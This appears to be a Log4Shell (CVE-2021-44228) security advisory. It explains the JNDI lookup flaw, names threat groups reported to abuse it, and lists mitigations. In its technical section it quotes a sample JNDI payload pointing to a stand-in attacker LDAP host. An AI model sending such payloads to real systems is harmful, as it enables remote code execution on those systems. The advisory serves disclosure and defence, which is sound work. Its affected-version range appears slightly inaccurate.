# CISA Cybersecurity Advisory: Apache Log4j Vulnerability (Log4Shell)
**Reference: AA21-356A | CVE-2021-44228 | Date: December 2021**

## Executive Summary
CISA and cybersecurity partners released a joint advisory regarding widespread exploitation of CVE-2021-44228, dubbed "Log4Shell". Log4Shell affects Apache Log4j versions 2.0-beta9 through 2.15.0. It provides remote unauthenticated attackers the ability to execute arbitrary code with the privileges of the running application.

## Technical Details & Attack Mechanics
The vulnerability exists due to improper input validation in the JNDI (Java Naming and Directory Interface) lookup mechanism. When message lookup substitution is enabled, an attacker can supply crafted string payloads such as `${jndi:ldap://attacker.domain/payload}`. The Log4j library resolves the JNDI lookup, connects to the malicious LDAP server, and loads remote Java bytecode, resulting in immediate unauthenticated Remote Code Execution (RCE).

## Adversary Attribution & In-The-Wild Abuse
Multiple nation-state advanced persistent threat (APT) actors and cybercrime syndicates have incorporated Log4Shell into automated exploitation scanners. Noteworthy groups include:
- Lazarus Group (DPRK): Utilized Log4Shell to compromise corporate networks for financial exfiltration and initial access.
- APT29 (Cozy Bear): Conducted reconnaissance scans across cloud infrastructure.
- Commodity Ransomware: Payloads such as Khonsari and TellYouThePass deployed via automated Log4Shell vectors.

## Required Mitigations
1. Upgrade immediately to Apache Log4j 2.17.1 or higher.
2. In versions prior to 2.16.0, remove the `JndiLookup` class from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.
3. Restrict outbound egress network connections from web applications, particularly LDAP (port 389, 636) and RMI (port 1099).
